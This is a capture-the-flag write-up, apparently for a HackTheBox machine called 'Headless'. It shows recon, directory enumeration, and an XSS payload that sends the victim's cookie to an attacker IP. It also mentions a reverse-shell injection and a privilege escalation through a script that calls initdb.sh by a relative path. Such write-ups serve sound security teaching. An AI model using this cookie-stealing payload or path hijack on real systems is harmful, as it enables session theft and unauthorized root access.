---
description: Linux | easy | Werkzeug 2.2.2 | xss cookie stealing | syscheck priv esc
---

# Headless

ip : 10.129.8.42



## Recon

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

```
Server: Werkzeug/2.2.2 Python/3.11.2


```

\=> Web server python sur le port 5000

```bash
echo "10.129.8.42 headless.htb" | sudo tee -a /etc/hosts
```



<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

## Enumeration&#x20;

```bash
gobuster dir -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u  http://headless.htb:5000
```

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

## Initial Foothold

Lets try to see if this form is vulnerable to XSS.&#x20;

```
<script>document.location="http://10.10.14.20:8000/plop?z="+document.cookie;</script> 
```

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

we switch the cookie via cookieEditor on the dashboard page



<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

## User Flag

<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

time to upload a reverse shell ! lets first url encode our payload

<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

Then inject it&#x20;

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

## Root Flag

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

here is syscheck  : &#x20;

```
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0

```

we can see that the script call initdb.sh whitout absolute path. lets creat an intdb.sh to gain privilege !&#x20;



<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
